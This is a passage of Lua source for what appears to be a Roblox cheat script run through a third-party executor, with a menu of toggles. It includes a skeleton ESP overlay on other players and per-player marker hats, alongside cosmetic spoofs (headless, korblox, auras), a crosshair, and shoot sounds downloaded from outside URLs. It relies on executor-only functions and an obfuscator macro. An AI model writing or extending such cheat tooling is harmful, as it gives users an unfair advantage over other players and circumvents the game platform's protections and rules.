                    data.boneLines[i].outline.From = from
                    data.boneLines[i].outline.To = to
                    data.boneLines[i].outline.Color = _G.skel_sett_882.skeletonsOutlineColor
                    data.boneLines[i].outline.Thickness = _G.skel_sett_882.skeletonsOutlineThickness
                    data.boneLines[i].outline.Transparency = 1 - _G.skel_sett_882.skeletonsOutlineAlpha
                    data.boneLines[i].outline.Visible = true
                    data.boneLines[i].main.From = from
                    data.boneLines[i].main.To = to
                    data.boneLines[i].main.Color = _G.skel_sett_882.skeletonsMainColor
                    data.boneLines[i].main.Thickness = _G.skel_sett_882.skeletonsMainThickness
                    data.boneLines[i].main.Transparency = 1 - _G.skel_sett_882.skeletonsMainAlpha
                    data.boneLines[i].main.Visible = true
                else
                    data.boneLines[i].outline.Visible = false
                    data.boneLines[i].main.Visible = false
                end
            else
                data.boneLines[i].outline.Visible = false
                data.boneLines[i].main.Visible = false
            end
        end
    end
end)
RunService:UnbindFromRenderStep("SkelFinal")
RunService:BindToRenderStep("SkelFinal", Enum.RenderPriority.Camera.Value + 1, _G.skel_upd_v5)
Players.PlayerRemoving:Connect(_G.skel_rem_v5)
getgenv().ChinaHatSettings = {
    enabled = false,
    hatColor = Color3.fromRGB(255, 136, 0),
    lightColor = Color3.fromRGB(255, 136, 0),
    lightBrightness = 1,
    lightRange = 12,
    scale = Vector3.new(1.7,1.1,1.7)
}
local Hats = {}
local function Visible(Character)
    local Head = Character:FindFirstChild("Head")
    if not Head then return false end
    local _, onscreen = game.Workspace.CurrentCamera:WorldToScreenPoint(Head.Position)
    return onscreen
end
local function UpdateHat(Cone)
    if Cone and Cone.Parent then
        Cone.Color = getgenv().ChinaHatSettings.hatColor
        local Light = Cone:FindFirstChildWhichIsA("PointLight")
        if Light then
            Light.Color = getgenv().ChinaHatSettings.lightColor
            Light.Brightness = getgenv().ChinaHatSettings.lightBrightness
            Light.Range = getgenv().ChinaHatSettings.lightRange
        end
    end
end
local function CreateHat(Character)
    if not Character then return end
    local Player = game.Players:GetPlayerFromCharacter(Character)
    if Player == game.Players.LocalPlayer and not _G.Config.Box.SelfESP then return end
    local Head = Character:FindFirstChild("Head")
    if not Head or Character:FindFirstChild("ChinaHat") then return end
    local Cone = Instance.new("Part")
    Cone.Name = "ChinaHat"
    Cone.Size = Vector3.new(1,1,1)
    Cone.Color = getgenv().ChinaHatSettings.hatColor
    Cone.Material = Enum.Material.Neon
    Cone.Transparency = 0.2
    Cone.CanCollide = false
    Cone.Anchored = false
    local Mesh = Instance.new("SpecialMesh")
    Mesh.MeshType = Enum.MeshType.FileMesh
    Mesh.MeshId = "rbxassetid://1033714"
    Mesh.Scale = getgenv().ChinaHatSettings.scale
    Mesh.Parent = Cone
    local Weld = Instance.new("Weld")
    Weld.Part0 = Head
    Weld.Part1 = Cone
    Weld.C0 = CFrame.new(0,0.9,0)
    Weld.Parent = Cone
    local Light = Instance.new("PointLight")
    Light.Color = getgenv().ChinaHatSettings.lightColor
    Light.Brightness = getgenv().ChinaHatSettings.lightBrightness
    Light.Range = getgenv().ChinaHatSettings.lightRange
    Light.Shadows = true
    Light.Parent = Cone
    Cone.Parent = Character
    Hats[Cone] = Character
    task.spawn(function()
        while Cone and Cone.Parent == Character and Character.Parent and getgenv().ChinaHatSettings.enabled do
            if Player == game.Players.LocalPlayer and not _G.Config.Box.SelfESP then break end
            Cone.Transparency = Visible(Character) and 0.2 or 1
            task.wait(0.1)
        end
        if Cone then
            Hats[Cone] = nil
            Cone:Destroy()
        end
    end)
end
local function CharAdded(Char)
    task.spawn(function()
        Char:WaitForChild("Head", 5)
        if getgenv().ChinaHatSettings.enabled then
            CreateHat(Char)
        end
    end)
end
for _,p in ipairs(game.Players:GetPlayers()) do
    p.CharacterAdded:Connect(CharAdded)
    if p.Character then CharAdded(p.Character) end
end

game.Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(CharAdded)
end)
section:toggle({
    name = "chinahat",
    flag = "chinahat_enabled",
    default = false,
    callback = function(Value)
        getgenv().ChinaHatSettings.enabled = Value
        for Cone, _ in pairs(Hats) do
            if Cone then Cone:Destroy() end
        end
        Hats = {}
        if Value then
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p.Character then
                    CreateHat(p.Character)
                end
            end
        end
    end
})
_G.d8ufjwye = {}
_G.v92mznw = workspace
_G.p01lxzq = game:GetService('TweenService')
_G.k47shrt = game:GetService('Players')
_G.q19pnvz = _G.k47shrt.LocalPlayer
_G.f28skdn = false
_G.z01nxpw = Color3.fromRGB(255, 0, 0)
_G.m33vbtq = Enum.Material.Neon
_G.j19dmxz = 3
_G.b44rpst = 0.5
_G.x02ksld = 0
_G.w99ncvz = {
    'Head', 'UpperTorso', 'LowerTorso', 
    'LeftUpperArm', 'LeftLowerArm', 'LeftHand',
    'RightUpperArm', 'RightLowerArm', 'RightHand',
    'LeftUpperLeg', 'LeftLowerLeg', 'LeftFoot',
    'RightUpperLeg', 'RightLowerLeg', 'RightFoot'
}
_G.u77vmsq = LPH_NO_VIRTUALIZE(function(targetChar)
    if not _G.f28skdn or not targetChar then return end
    local targetPlayer = game.Players:GetPlayerFromCharacter(targetChar)
    if targetPlayer == game.Players.LocalPlayer and not _G.Config.Box.SelfESP then return end
    _G.r01ncmx = tick()
    if _G.r01ncmx - _G.x02ksld < 0.1 then return end
    _G.x02ksld = _G.r01ncmx
    _G.t55pqlm = targetChar:FindFirstChild('HumanoidRootPart')
    if not _G.t55pqlm then return end
    targetChar.Archivable = true
    local clone = targetChar:Clone()
    clone.Name = 'BasePart'
    for _, child in ipairs(clone:GetChildren()) do
        if child:IsA('BasePart') then
            local isBodyPart = false
            for _, name in ipairs(_G.w99ncvz) do
                if child.Name == name then
                    isBodyPart = true
                    break
                end
            end
            if not isBodyPart then child:Destroy() end
        elseif not child:IsA('Humanoid') then
            child:Destroy()
        end
    end
    if clone:FindFirstChild('Humanoid') then
        clone.Humanoid:Destroy()
    end
    for _, part in ipairs(clone:GetChildren()) do
        if part:IsA('BasePart') then
            part.CanCollide = false
            part.Anchored = true
            part.Transparency = _G.b44rpst
            part.Color = _G.z01nxpw
            part.Material = _G.m33vbtq
            if part.Name == "Head" and part:FindFirstChild("face") then
                part.face:Destroy()
            end
        end
    end
    clone.Parent = _G.v92mznw
    local tInfo = TweenInfo.new(_G.j19dmxz, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
    for _, part in ipairs(clone:GetChildren()) do
        if part:IsA('BasePart') then
            _G.p01lxzq:Create(part, tInfo, {Transparency = 1}):Play()
        end
    end
    task.delay(_G.j19dmxz, function()
        if clone then clone:Destroy() end
    end)
end)
getgenv().crosshair = {
    enabled = false,
    refreshrate = 0,
    mode = "mouse",
    position = Vector2.new(0, 0),
    width = 1.5,
    length = 10,
    radius = 11, 
    color = Color3.fromRGB(255, 136, 0),
    spin = true,          
    spin_speed = 150,
    spin_max = 340,
    spin_style = Enum.EasingStyle.Sine
}
local section2222 = Visuals:section({name = "crosshair",side = "right"})
local section2323 = Visuals:section({name = "fps overlay", side = "right"})
local Run = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local Tween = game:GetService("TweenService")
local Cam = workspace.CurrentCamera
local draw_text1 = Drawing.new("Text")
draw_text1.Size = 13
draw_text1.Font = 2
draw_text1.Outline = true
draw_text1.Text = "Sample"
draw_text1.Color = Color3.new(1,1,1)
local draw_text2 = Drawing.new("Text")
draw_text2.Size = 13
draw_text2.Font = 2
draw_text2.Outline = true
draw_text2.Text = ".hit"
local lines = {}
for i = 1,8 do
    lines[i] = Drawing.new("Line")
end
local last = 0
local angles = {0,90,180,270}
local function solve(a, r)
    local rad = math.rad(a)
    return Vector2.new(math.sin(rad)*r, math.cos(rad)*r)
end
Run.PostSimulation:Connect(function()
    local t = os.clock()
    if t - last < getgenv().crosshair.refreshrate then return end
    last = t
    local cfg = getgenv().crosshair
    local pos = cfg.mode == "center" and Cam.ViewportSize/2 or
                cfg.mode == "mouse" and UIS:GetMouseLocation() or
                cfg.position
    local enabled = cfg.enabled
    draw_text1.Visible = enabled
    draw_text2.Visible = enabled
    if not enabled then
        for i=1,8 do lines[i].Visible = false end
        return
    end
    local base_y = cfg.radius + cfg.length + 15
    local textpos = pos + Vector2.new(-(draw_text1.TextBounds.X + draw_text2.TextBounds.X)/2, base_y)
    draw_text1.Position = textpos
    draw_text2.Position = textpos + Vector2.new(draw_text1.TextBounds.X)
    draw_text2.Color = cfg.color
    local spin_angle = 0
    if cfg.spin then
        local raw = -(t * cfg.spin_speed) % cfg.spin_max
        spin_angle = Tween:GetValue(raw/360, cfg.spin_style, Enum.EasingDirection.InOut) * 360
    end
    for i = 1,4 do
        local basea = angles[i] + spin_angle
        local p1 = pos + solve(basea, cfg.radius)
        local p2 = pos + solve(basea, cfg.radius + cfg.length)
        local inl = lines[i+4]
        inl.Visible = true
        inl.Color = cfg.color
        inl.From = p1
        inl.To = p2
        inl.Thickness = cfg.width
        local out = lines[i]
        out.Visible = true
        out.Color = Color3.new(0,0,0)
        out.From = pos + solve(basea, cfg.radius - 1)
        out.To = pos + solve(basea, (cfg.radius + cfg.length) + 1)
        out.Thickness = cfg.width + 1.5
    end
end)

section2222:toggle({
    name = "crosshair",
    flag = "crosshaireeee",
    default = false,
    callback = function(Value)
        getgenv().crosshair.enabled = Value
    end
})
section2222:colorpicker({
    name = "accent color",
    flag = "crosshair_color",
    color = getgenv().crosshair.color,
    callback = function(Value)
        getgenv().crosshair.color = Value
    end
})

section2222:slider({
    name = "spin speed",
    flag = "crosshair_spin",
    default = getgenv().crosshair.spin_speed,
    min = 0,
    max = 340,
    interval = 1,
    callback = function(Value)
        getgenv().crosshair.spin_speed = Value
    end
})
_G.FPSDrawing = Drawing.new("Text")
_G.FPSDrawing.Visible = false
_G.FPSDrawing.Size = 18
_G.FPSDrawing.Font = 2
_G.FPSDrawing.Color = Color3.fromRGB(255, 136, 0)
_G.FPSDrawing.Outline = true
_G.FPSDrawing.OutlineColor = Color3.fromRGB(0,0,0)
_G.FPSDrawing.Transparency = 1
_G.FPSDrawing.Position = Vector2.new(16,417)
_G.FPSDrawing.Text = "FPS: 000"
_G.FPSCount = 0
_G.FPSLast = tick()
_G.FPSConnection = game:GetService("RunService").Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
    _G.FPSCount = _G.FPSCount + 1
    local currentTime = tick()
    if currentTime - _G.FPSLast >= 0.5 then
        local fps = math.floor(_G.FPSCount / (currentTime - _G.FPSLast) + 0.5)
        _G.FPSDrawing.Text = "FPS: " .. string.format("%03d", fps)
        _G.FPSCount = 0
        _G.FPSLast = currentTime
    end
end))
section2323:toggle({
    name = "fps overlay",
    flag = "fps_enabled",
    default = false,
    callback = function(v)
        _G.FPSDrawing.Visible = v
    end
})
section2323:colorpicker({
    name = "fps color",
    flag = "fps_color",
    color = Color3.fromRGB(255, 136, 0),
    callback = function(c)
        _G.FPSDrawing.Color = c
    end
})
section2323:slider({
    name = "position x",
    flag = "fps_x",
    default = 16,
    min = 0,
    max = 2000,
    interval = 1,
    callback = function(v)
        _G.FPSDrawing.Position = Vector2.new(v, _G.FPSDrawing.Position.Y)
    end
})
section2323:slider({
    name = "position y",
    flag = "fps_y",
    default = 417,
    min = 0,
    max = 2000,
    interval = 1,
    callback = function(v)
        _G.FPSDrawing.Position = Vector2.new(_G.FPSDrawing.Position.X, v)
    end
})
getgenv().player = LocalPlayer
getgenv().forcefield = nil
getgenv().AuraFFEnabled = false
getgenv().createFF = function()
    if getgenv().player.Character and not getgenv().forcefield then
        getgenv().forcefield = Instance.new("ForceField")
        getgenv().forcefield.Visible = true
        getgenv().forcefield.Parent = getgenv().player.Character
    end
end
getgenv().removeFF = function()
    if getgenv().forcefield then
        getgenv().forcefield:Destroy()
        getgenv().forcefield = nil
    end
end
_G.KorbloxEnabled = false
_G.KorbloxAccessoryID = 18457575895
_G.ApplyKorblox = function(char)
    if not _G.KorbloxEnabled or not char then return end
    pcall(function()
        local rLegs = {"RightUpperLeg", "RightLowerLeg", "RightFoot"}
        for _, name in pairs(rLegs) do
            if char:FindFirstChild(name) then char[name].Transparency = 1 end
        end
        local objs = game:GetObjects("rbxassetid://" .. _G.KorbloxAccessoryID)
        local acc = objs and objs[1]
        if acc and char:FindFirstChild("RightUpperLeg") then
            acc.Parent = char
            local handle = acc:FindFirstChild("Handle")
            if handle then
                handle.CFrame = char.RightUpperLeg.CFrame
                local weld = Instance.new("Weld", handle)
                weld.Part0 = handle
                weld.Part1 = char.RightUpperLeg
                weld.C0 = CFrame.new(0, -0.12, 0)
            end
        end
    end)
end
_G.RemoveKorblox = function(char)
    if not char then return end
    local rLegs = {"RightUpperLeg", "RightLowerLeg", "RightFoot"}
    for _, name in pairs(rLegs) do
        if char:FindFirstChild(name) then char[name].Transparency = 0 end
    end
    for _, acc in ipairs(char:GetChildren()) do
        if acc:IsA("Accessory") and acc:FindFirstChild("Handle") then
            local handle = acc.Handle
            local mesh = handle:FindFirstChildWhichIsA("SpecialMesh")
            if mesh and (mesh.MeshId:match("18457575888")) then
                acc:Destroy()
            end
        end
    end
end
_G.HeadlessEnabled = false
_G.HeadlessLoop = function()
    if not _G.HeadlessEnabled then return end
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Head") then
        char.Head.Transparency = 1
        if char.Head:FindFirstChild("face") then char.Head.face.Transparency = 1 end
    end
end
local aurassss = Visuals:section({ name = "self visuals", side = "right" })
_G.aurp = _G.aurp or {}
_G.aurasst = {
    ["starlight"] = game:GetObjects("rbxassetid://134645216613107")[1],
    ["heavenly"] = game:GetObjects("rbxassetid://139300897520961")[1],
    ["ribbon"] = game:GetObjects("rbxassetid://132069507632161")[1],
    ["sakura"] = game:GetObjects("rbxassetid://81755778619404")[1],
    ["angel"] = game:GetObjects("rbxassetid://97658130917593")[1],
    ["wind"] = game:GetObjects("rbxassetid://80694081850877")[1],
    ["flow"] = game:GetObjects("rbxassetid://119913533725648")[1],
    ["star"] = game:GetObjects("rbxassetid://73754563740680")[1],
}
_G.updaurcol = LPH_NO_VIRTUALIZE(function()
    local col = _G.aurcolwtff or Color3.fromRGB(255, 94, 0)
    local seq = ColorSequence.new(col)
    for i = 1, #_G.aurp do
        local p = _G.aurp[i]
        if p then
            if p:IsA("ParticleEmitter") or p:IsA("Trail") or p:IsA("Beam") then
                p.Color = seq
            elseif p:IsA("PointLight") then
                p.Color = col
            end
            local des = p:GetDescendants()
            for j = 1, #des do
                local d = des[j]
                if d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Beam") then
                    d.Color = seq
                elseif d:IsA("PointLight") then
                    d.Color = col
                end
            end
        end
    end
end)
_G.clraur = function()
    for i = 1, #_G.aurp do
        local v = _G.aurp[i]
        if v then v:Destroy() end
    end
    table.clear(_G.aurp)
end
_G.applaur = LPH_NO_VIRTUALIZE(function()
    _G.clraur()
    if not _G.aurenabwtff then return end
    local char = game.Players.LocalPlayer.Character
    local asset = _G.aurasst[_G.selaurwtff or "angel"]
    if char and asset then
        local clo = asset:Clone()
        local kids = clo:GetChildren()
        for i = 1, #kids do
            local m_p = kids[i]
            local targ = char:FindFirstChild(m_p.Name)
            if targ then
                local effs = m_p:GetChildren()
                for j = 1, #effs do
                    local eff = effs[j]
                    eff.Name = "\0"
                    eff.Parent = targ
                    table.insert(_G.aurp, eff)
                end
            end
        end
        clo:Destroy()
        _G.updaurcol()
    end
end)
aurassss:toggle({
    name = "apply aura",
    flag = "GRSB_FSGS_B_DS_DBEIUWHHUVCNBNB)",
    default = false,
    callback = function(v)
        _G.aurenabwtff = v
        if v then
            _G.applaur()
            if not _G.aurconwtff then
                _G.aurconwtff = game.Players.LocalPlayer.CharacterAdded:Connect(function()
                    task.wait(1)
                    if _G.aurenabwtff then _G.applaur() end
                end)
            end
        else
            _G.clraur()
        end
    end
})
aurassss:colorpicker({
    flag = "dfgbdsfiuhuidfhiudfhjgidfoshgipsdhfgipufvdhsiudfhiu",
    color = Color3.fromRGB(255, 94, 0),
    callback = function(val)
        _G.aurcolwtff = val
        _G.updaurcol()
    end
})
aurassss:dropdown({
    name = "aura type",
    flag = "shootsound_f",
    items = {"starlight", "heavenly", "ribbon", "sakura", "angel", "wind", "flow", "star"},
    default = "angel",
    multi = false,
    callback = function(val)
        _G.selaurwtff = val
        if _G.aurenabwtff then _G.applaur() end
    end
})
_G.ff_c = Color3.fromRGB(255, 94, 0)
_G.ff_en = false
_G.tff_c = Color3.fromRGB(255, 94, 0)
_G.tff_en = false
local function app_ff(char, col, en)
    local des = char:GetDescendants()
    for i = 1, #des do
        local p = des[i]
        if p:IsA("BasePart") and not p:FindFirstAncestorOfClass("Tool") then
            if en then
                if p.Material ~= Enum.Material.ForceField then
                    p.Material = Enum.Material.ForceField
                    p.Color = col
                end
            else
                p.Material = Enum.Material.Plastic
            end
        end
    end
end
local function app_tff(char, col, en)
    local kids = char:GetChildren()
    for i = 1, #kids do
        local t = kids[i]
        if t:IsA("Tool") then
            local des = t:GetDescendants()
            for j = 1, #des do
                local p = des[j]
                if p:IsA("BasePart") then
                    if en then
                        if p.Material ~= Enum.Material.ForceField then
                            p.Material = Enum.Material.ForceField
                            p.Color = col
                        end
                    else
                        p.Material = Enum.Material.Plastic
                    end
                end
            end
        end
    end
end
game:GetService("RunService").RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    if not (_G.ff_en or _G.tff_en) then return end
    local char = game.Players.LocalPlayer.Character
    if not char then return end
    
    if _G.ff_en then
        app_ff(char, _G.ff_c, true)
    end
    if _G.tff_en then
        app_tff(char, _G.tff_c, true)
    end
end))
aurassss:toggle({
    name = "character forcefield",
    flag = "chcccvv_enabled",
    default = false,
    callback = function(v)
        _G.ff_en = v
        if not v and game.Players.LocalPlayer.Character then
            app_ff(game.Players.LocalPlayer.Character, Color3.new(1,1,1), false)
        end
    end
})
aurassss:colorpicker({
    flag = "dfgbdsfiuhufvdhsiudfhiu",
    color = Color3.fromRGB(255, 94, 0),
    callback = function(val)
        _G.ff_c = (typeof(val) == "table") and Color3.new(val.R or val[1], val.G or val[2], val.B or val[3]) or val
    end
})
aurassss:toggle({
    name = "tools forcefield",
    flag = "tool_ff_enabled",
    default = false,
    callback = function(v)
        _G.tff_en = v
        if not v and game.Players.LocalPlayer.Character then
            app_tff(game.Players.LocalPlayer.Character, Color3.new(1,1,1), false)
        end
    end
})
aurassss:colorpicker({
    flag = "dfgbdsfiiudfhiu",
    color = Color3.fromRGB(255, 94, 0),
    callback = function(val)
        _G.tff_c = (typeof(val) == "table") and Color3.new(val.R or val[1], val.G or val[2], val.B or val[3]) or val
    end
})
aurassss:toggle({
    name = "fake roblox forcefield",
    flag = "aurafff_toggle",
    default = false,
    callback = function(v)
        getgenv().AuraFFEnabled = v
        if v then getgenv().createFF() else getgenv().removeFF() end
    end
})
aurassss:toggle({
    name = "korblox",
    flag = "korblox_toggle",
    default = false,
    callback = function(v)
        _G.KorbloxEnabled = v
        if v then 
            _G.ApplyKorblox(LocalPlayer.Character) 
        else 
            _G.RemoveKorblox(LocalPlayer.Character) 
        end
    end
})
aurassss:toggle({
    name = "headless",
    flag = "headless_toggle",
    default = false,
    callback = function(v)
        _G.HeadlessEnabled = v
        if v then
            RunService:BindToRenderStep("HeadlessLoop", 201, _G.HeadlessLoop)
        else
            RunService:UnbindFromRenderStep("HeadlessLoop")
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
                LocalPlayer.Character.Head.Transparency = 0
                if LocalPlayer.Character.Head:FindFirstChild("face") then LocalPlayer.Character.Head.face.Transparency = 0 end
            end
        end
    end
})
LocalPlayer.CharacterAdded:Connect(function(char)
    task.wait(1)
    if _G.KorbloxEnabled then _G.ApplyKorblox(char) end
    if getgenv().AuraFFEnabled then getgenv().createFF() end
end)
_G.ShootSoundOverride = _G.ShootSoundOverride or false
_G.SelectedShootSound = _G.SelectedShootSound or "Default"
_G.ShootSoundVolume = _G.ShootSoundVolume or 2
_G.ShootSoundPitch = _G.ShootSoundPitch or 1
_G.SHOOT_SOUNDS_DATA = {
    Default = "",
    ["Rust HS"] = "rbxassetid://5043539486",
    ["Neverlose"] = "rbxassetid://97643101798871",
    ["Minecraft Bow"] = "rbxassetid://3442683707",
    ["Skeet"] = "https://raw.githubusercontent.com/f1nobe7650/Nebula/refs/heads/main/Sounds/Skeet.mp3",
    ["Bathit"] = "https://raw.githubusercontent.com/f1nobe7650/Nebula/refs/heads/main/Sounds/BatHit.mp3",
    ["Oblivity"] = "https://cdn.getsample.lol/uz1lp3e6",
}
_G.OriginalSoundData = _G.OriginalSoundData or {}
_G.CachedAssets = _G.CachedAssets or {}
_G.getAsset_hdsy = function(name, url)
    if not url or url == "" then return "" end
    if not url:find("http") then return url end
    if _G.CachedAssets[name] then return _G.CachedAssets[name] end
    local fileName = name .. ".mp3"
    if not isfile(fileName) then
        local success, data = pcall(function() return game:HttpGet(url, true) end)
        if success then writefile(fileName, data) end
    end
    local assetId
    local synSuccess, synAsset = pcall(function() return getsynasset(fileName) end)
    if synSuccess then
        assetId = synAsset
    else
        local custSuccess, custAsset = pcall(function() return getcustomasset(fileName) end)
        if custSuccess then assetId = custAsset end
    end
    _G.CachedAssets[name] = assetId
    return assetId
end
_G.reOverrideTool_hdsy = function(tool)
    if not tool or not _G.ShootSoundOverride or _G.SelectedShootSound == "Default" then return end
    local rawId = _G.SHOOT_SOUNDS_DATA[_G.SelectedShootSound]
    local id = _G.getAsset_hdsy(_G.SelectedShootSound, rawId)
    if id == "" then return end
    local soundId = id
    local volume = _G.ShootSoundVolume * 10
    local pitch = _G.ShootSoundPitch
    for _, obj in ipairs(tool:GetDescendants()) do
        local objName = obj.Name
        if obj:IsA("Sound") and (objName:lower():find("shoot") or objName == "ShootSound" or objName == "Fire" or objName == "Gunshot") then
            if not _G.OriginalSoundData[obj] then
                _G.OriginalSoundData[obj] = {SoundId = obj.SoundId, Volume = obj.Volume, PlaybackSpeed = obj.PlaybackSpeed}
            end
            obj.SoundId = soundId
            obj.Volume = volume
            obj.PlaybackSpeed = pitch
        end
    end
end
_G.overrideShootSounds_hdsy = function()
    local containers = {LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character}
    for _, container in ipairs(containers) do
        if not container then continue end
        for _, tool in ipairs(container:GetChildren()) do
            if tool:IsA("Tool") then
                _G.reOverrideTool_hdsy(tool)
            end
        end
    end
end
_G.restoreAllShootSounds_hdsy = function()
    for sound, data in pairs(_G.OriginalSoundData) do
        if sound and sound.Parent then
            sound.SoundId = data.SoundId
            sound.Volume = data.Volume
            sound.PlaybackSpeed = data.PlaybackSpeed
        end
    end
    _G.OriginalSoundData = {}
end
_G.soundSection = Visuals:section({ name = "custom shoot sounds", side = "right" })
_G.soundSection:toggle({
    name = "enabled",
    flag = "shootsound_enabled",
    default = _G.ShootSoundOverride,
    callback = function(state)
        _G.ShootSoundOverride = state
        if state then _G.overrideShootSounds_hdsy() else _G.restoreAllShootSounds_hdsy() end
    end
})
_G.soundSection:dropdown({
    name = "sound selection",
    flag = "shootsound_val",
    items = {"Default", "Rust HS", "Neverlose", "Minecraft Bow", "Oblivity","Skeet", "Bathit"},
    default = _G.SelectedShootSound,
    multi = false,
    callback = function(val)
        _G.SelectedShootSound = val
        if _G.ShootSoundOverride then _G.overrideShootSounds_hdsy() end
    end
})
_G.soundSection:slider({
    name = "volume booster",
    flag = "shootsound_vol",
    min = 0,
    max = 10,
    default = _G.ShootSoundVolume,
    interval = 0.1,
    callback = function(num)
        _G.ShootSoundVolume = num
        if _G.ShootSoundOverride then _G.overrideShootSounds_hdsy() end
    end
})
_G.soundSection:slider({
    name = "sound pitch",
    flag = "shootsound_ptc",
    min = 0,
    max = 10,
    default = _G.ShootSoundPitch,
    interval = 0.1,
    callback = function(num)
        _G.ShootSoundPitch = num
        if _G.ShootSoundOverride then _G.overrideShootSounds_hdsy() end
    end
})
task.spawn(function()
    while task.wait(2) do
        if _G.ShootSoundOverride then 
            _G.overrideShootSounds_hdsy() 
        end
    end
end)
_G.skyboxes = {
    ["Sunset"] = {
        SkyboxBk = "http://www.roblox.com/asset/?id=458016711",
        SkyboxDn = "http://www.roblox.com/asset/?id=458016826",
        SkyboxFt = "http://www.roblox.com/asset/?id=458016532",
        SkyboxLf = "http://www.roblox.com/asset/?id=458016655",
        SkyboxRt = "http://www.roblox.com/asset/?id=458016782",
        SkyboxUp = "http://www.roblox.com/asset/?id=458016792"
    },
    ["Night Sky 1"] = {
        SkyboxBk = "rbxassetid://48020371",
        SkyboxDn = "rbxassetid://48020144",
        SkyboxFt = "rbxassetid://48020234",
        SkyboxLf = "rbxassetid://48020211",
        SkyboxRt = "rbxassetid://48020254",
        SkyboxUp = "rbxassetid://48020383"
    },
    ["Minecraft"] = {
        SkyboxBk = "rbxassetid://1876545003",
        SkyboxDn = "rbxassetid://1876544331",
        SkyboxFt = "rbxassetid://1876542941",
        SkyboxLf = "rbxassetid://1876543392",
        SkyboxRt = "rbxassetid://1876543764",
        SkyboxUp = "rbxassetid://1876544642"
    },
    ["Evening"] = {
        SkyboxLf = "http://www.roblox.com/asset/?id=7950573918",
        SkyboxBk = "http://www.roblox.com/asset/?id=7950569153",
        SkyboxDn = "http://www.roblox.com/asset/?id=7950570785",
        SkyboxFt = "http://www.roblox.com/asset/?id=7950572449",
        SkyboxRt = "http://www.roblox.com/asset/?id=7950575055",
        SkyboxUp = "http://www.roblox.com/asset/?id=7950627627"
    },
    ["Purple Nebula"] = {
        SkyboxBk = "rbxassetid://159454299",
        SkyboxDn = "rbxassetid://159454296",
        SkyboxFt = "rbxassetid://159454293",
        SkyboxLf = "rbxassetid://159454286",
        SkyboxRt = "rbxassetid://159454300",
        SkyboxUp = "rbxassetid://159454288"
    },
    ["Night Sky 2"] = {
        SkyboxBk = "rbxassetid://12064107",
        SkyboxDn = "rbxassetid://12064152",
        SkyboxFt = "rbxassetid://12064121",
        SkyboxLf = "rbxassetid://12063984",
        SkyboxRt = "rbxassetid://12064115",
        SkyboxUp = "rbxassetid://12064131"
    },
    ["Pink Daylight"] = {
        SkyboxBk = "rbxassetid://271042516",
        SkyboxDn = "rbxassetid://271077243",
        SkyboxFt = "rbxassetid://271042556",
        SkyboxLf = "rbxassetid://271042310",
        SkyboxRt = "rbxassetid://271042467",
        SkyboxUp = "rbxassetid://271077958"
    },
    ["Morning Glow"] = {
        SkyboxBk = "rbxassetid://1417494030",
        SkyboxDn = "rbxassetid://1417494146",
        SkyboxFt = "rbxassetid://1417494253",
        SkyboxLf = "rbxassetid://1417494402",
        SkyboxRt = "rbxassetid://1417494499",
        SkyboxUp = "rbxassetid://1417494643"
    },
    ["Chill"] = {
        SkyboxBk = "rbxassetid://5084575798",
        SkyboxDn = "rbxassetid://5084575916",
        SkyboxFt = "rbxassetid://5103949679",
        SkyboxLf = "rbxassetid://5103948542",
        SkyboxRt = "rbxassetid://5103948784",
        SkyboxUp = "rbxassetid://5084576400"
    },
    ["Setting Sun"] = {
        SkyboxBk = "rbxassetid://626460377",
        SkyboxDn = "rbxassetid://626460216",
        SkyboxFt = "rbxassetid://626460513",
        SkyboxLf = "rbxassetid://626473032",
        SkyboxRt = "rbxassetid://626458639",
        SkyboxUp = "rbxassetid://626460625"
    },
    ["Fade Blue"] = {
        SkyboxBk = "rbxassetid://153695414",
        SkyboxDn = "rbxassetid://153695352",
        SkyboxFt = "rbxassetid://153695452",
        SkyboxLf = "rbxassetid://153695320",
        SkyboxRt = "rbxassetid://153695383",
        SkyboxUp = "rbxassetid://153695471"
    },
    ["Twilight"] = {
        SkyboxBk = "rbxassetid://264908339",
        SkyboxDn = "rbxassetid://264907909",
        SkyboxFt = "rbxassetid://264909420",
        SkyboxLf = "rbxassetid://264909758",
        SkyboxRt = "rbxassetid://264908886",
        SkyboxUp = "rbxassetid://264907379"
    },
    ["Elegant Morning"] = {
        SkyboxBk = "rbxassetid://153767241",
        SkyboxDn = "rbxassetid://153767216",
        SkyboxFt = "rbxassetid://153767266",
        SkyboxLf = "rbxassetid://153767200",
        SkyboxRt = "rbxassetid://153767231",
        SkyboxUp = "rbxassetid://153767288"
    },
    ["Neptune"] = {
        SkyboxBk = "rbxassetid://218955819",
        SkyboxDn = "rbxassetid://218953419",
        SkyboxFt = "rbxassetid://218954524",
        SkyboxLf = "rbxassetid://218958493",
        SkyboxRt = "rbxassetid://218957134",
        SkyboxUp = "rbxassetid://218950090"
    },
    ["Redshift"] = {
        SkyboxBk = "rbxassetid://401664839",
        SkyboxDn = "rbxassetid://401664862",
        SkyboxFt = "rbxassetid://401664960",
        SkyboxLf = "rbxassetid://401664881",
        SkyboxRt = "rbxassetid://401664901",
        SkyboxUp = "rbxassetid://401664936"
    },
        ["Realistic Desert"] = {
        SkyboxBk = "rbxassetid://161319957",
        SkyboxDn = "rbxassetid://161319965",
        SkyboxFt = "rbxassetid://161319970",
        SkyboxLf = "rbxassetid://161319983",
        SkyboxRt = "rbxassetid://161319989",
        SkyboxUp = "rbxassetid://161319996"
    },
    ["Aesthetic Night"] = {
        SkyboxBk = "rbxassetid://1045964490",
        SkyboxDn = "rbxassetid://1045964368",
        SkyboxFt = "rbxassetid://1045964655",
        SkyboxLf = "rbxassetid://1045964655",
        SkyboxRt = "rbxassetid://1045964655",
        SkyboxUp = "rbxassetid://1045962969"
    }
}
_G.selected_skybox = "Sunset"
_G.skybox_locked = false
local originalSkyData = nil
local function backupOriginalSky()
    local sky = game.Lighting:FindFirstChildOfClass("Sky")
    if sky and not originalSkyData then
        originalSkyData = {
            Bk = sky.SkyboxBk,
            Dn = sky.SkyboxDn,
            Ft = sky.SkyboxFt,
            Lf = sky.SkyboxLf,
            Rt = sky.SkyboxRt,
